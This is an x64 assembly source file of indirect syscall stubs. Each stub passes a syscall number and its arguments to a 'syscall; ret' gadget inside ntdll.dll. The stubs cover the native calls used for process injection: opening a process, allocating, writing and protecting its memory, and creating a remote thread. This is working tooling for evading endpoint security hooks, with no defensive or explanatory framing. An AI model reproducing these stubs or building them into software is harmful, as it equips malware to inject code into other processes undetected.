.code

; ==============================================================================
; Indirect Syscall Stubs - Gadget-Based Approach
; All stubs use the pattern: (gadget, ssn, arg1, arg2, ...)
; The gadget points to a "syscall; ret" sequence in ntdll.dll
; ==============================================================================

; ---- NtClose (1 arg) ----
SysNtClose PROC
    mov r11, rcx                    ; save gadget address
    mov rax, rdx                    ; SSN -> rax
    mov r10, r8                     ; Handle -> r10 (arg1)
    jmp r11                         ; jump to syscall;ret gadget
SysNtClose ENDP

; ---- NtOpenProcess (4 args) ----
SysNtOpenProcess PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; DesiredAccess -> rdx (arg2)
    mov r8, [rsp+28h]               ; ObjectAttributes -> r8 (arg3)
    mov r9, [rsp+30h]               ; ClientId -> r9 (arg4)
    jmp r11
SysNtOpenProcess ENDP

; ---- NtAllocateVirtualMemory (6 args) ----
SysNtAllocateVirtualMemory PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; BaseAddress -> rdx (arg2)
    mov r8, [rsp+28h]               ; ZeroBits -> r8 (arg3)
    mov r9, [rsp+30h]               ; RegionSize -> r9 (arg4)
    ; Shift stack args: arg5,arg6 -> [rsp+28h],[rsp+30h]
    mov rcx, [rsp+38h]              ; AllocationType
    mov [rsp+28h], rcx
    mov rcx, [rsp+40h]              ; Protect
    mov [rsp+30h], rcx
    jmp r11
SysNtAllocateVirtualMemory ENDP

; ---- NtFreeVirtualMemory (4 args) ----
SysNtFreeVirtualMemory PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; BaseAddress -> rdx (arg2)
    mov r8, [rsp+28h]               ; RegionSize -> r8 (arg3)
    mov r9, [rsp+30h]               ; FreeType -> r9 (arg4)
    jmp r11
SysNtFreeVirtualMemory ENDP

; ---- NtProtectVirtualMemory (5 args) ----
SysNtProtectVirtualMemory PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; BaseAddress -> rdx (arg2)
    mov r8, [rsp+28h]               ; RegionSize -> r8 (arg3)
    mov r9, [rsp+30h]               ; NewProtect -> r9 (arg4)
    ; Shift: arg5 -> [rsp+28h]
    mov rcx, [rsp+38h]              ; OldProtect
    mov [rsp+28h], rcx
    jmp r11
SysNtProtectVirtualMemory ENDP

; ---- NtWriteVirtualMemory (5 args) ----
SysNtWriteVirtualMemory PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; BaseAddress -> rdx (arg2)
    mov r8, [rsp+28h]               ; Buffer -> r8 (arg3)
    mov r9, [rsp+30h]               ; Size -> r9 (arg4)
    ; Shift: arg5 -> [rsp+28h]
    mov rcx, [rsp+38h]              ; BytesWritten
    mov [rsp+28h], rcx
    jmp r11
SysNtWriteVirtualMemory ENDP

; ---- NtReadVirtualMemory (5 args) ----
SysNtReadVirtualMemory PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; BaseAddress -> rdx (arg2)
    mov r8, [rsp+28h]               ; Buffer -> r8 (arg3)
    mov r9, [rsp+30h]               ; Size -> r9 (arg4)
    ; Shift: arg5 -> [rsp+28h]
    mov rcx, [rsp+38h]              ; BytesRead
    mov [rsp+28h], rcx
    jmp r11
SysNtReadVirtualMemory ENDP

; ---- NtQueryVirtualMemory (6 args) ----
SysNtQueryVirtualMemory PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; BaseAddress -> rdx (arg2)
    mov r8, [rsp+28h]               ; MemInfoClass -> r8 (arg3)
    mov r9, [rsp+30h]               ; MemInfo -> r9 (arg4)
    ; Shift: arg5,arg6 -> [rsp+28h],[rsp+30h]
    mov rcx, [rsp+38h]              ; MemInfoLength
    mov [rsp+28h], rcx
    mov rcx, [rsp+40h]              ; ReturnLength
    mov [rsp+30h], rcx
    jmp r11
SysNtQueryVirtualMemory ENDP

; ---- NtCreateThreadEx (11 args) ----
SysNtCreateThreadEx PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ThreadHandle -> r10 (arg1)
    mov rdx, r9                     ; DesiredAccess -> rdx (arg2)
    mov r8, [rsp+28h]               ; ObjectAttributes -> r8 (arg3)
    mov r9, [rsp+30h]               ; ProcessHandle -> r9 (arg4)
    ; Shift remaining 7 stack args by 2 slots (16 bytes)
    mov rcx, [rsp+38h]              ; StartRoutine -> [rsp+28h]
    mov [rsp+28h], rcx
    mov rcx, [rsp+40h]              ; Argument -> [rsp+30h]
    mov [rsp+30h], rcx
    mov rcx, [rsp+48h]              ; CreateFlags -> [rsp+38h]
    mov [rsp+38h], rcx
    mov rcx, [rsp+50h]              ; ZeroBits -> [rsp+40h]
    mov [rsp+40h], rcx
    mov rcx, [rsp+58h]              ; StackSize -> [rsp+48h]
    mov [rsp+48h], rcx
    mov rcx, [rsp+60h]              ; MaxStackSize -> [rsp+50h]
    mov [rsp+50h], rcx
    mov rcx, [rsp+68h]              ; AttributeList -> [rsp+58h]
    mov [rsp+58h], rcx
    jmp r11
SysNtCreateThreadEx ENDP

; ---- NtWaitForSingleObject (3 args) ----
SysNtWaitForSingleObject PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; Handle -> r10 (arg1)
    mov rdx, r9                     ; Alertable -> rdx (arg2)
    mov r8, [rsp+28h]               ; Timeout -> r8 (arg3)
    jmp r11
SysNtWaitForSingleObject ENDP

; ---- NtDelayExecution (2 args) ----
SysNtDelayExecution PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; Alertable -> r10 (arg1)
    mov rdx, r9                     ; DelayInterval -> rdx (arg2)
    jmp r11
SysNtDelayExecution ENDP

; ---- NtQueryInformationProcess (5 args) ----
SysNtQueryInformationProcess PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; ProcessInfoClass -> rdx (arg2)
    mov r8, [rsp+28h]               ; ProcessInfo -> r8 (arg3)
    mov r9, [rsp+30h]               ; ProcessInfoLength -> r9 (arg4)
    ; Shift: arg5 -> [rsp+28h]
    mov rcx, [rsp+38h]              ; ReturnLength
    mov [rsp+28h], rcx
    jmp r11
SysNtQueryInformationProcess ENDP

; ---- NtOpenProcessToken (3 args) ----
SysNtOpenProcessToken PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; DesiredAccess -> rdx (arg2)
    mov r8, [rsp+28h]               ; TokenHandle -> r8 (arg3)
    jmp r11
SysNtOpenProcessToken ENDP

; ---- NtTerminateProcess (2 args) ----
SysNtTerminateProcess PROC
    mov r11, rcx                    ; save gadget
    mov rax, rdx                    ; SSN
    mov r10, r8                     ; ProcessHandle -> r10 (arg1)
    mov rdx, r9                     ; ExitStatus -> rdx (arg2)
    jmp r11
SysNtTerminateProcess ENDP

end
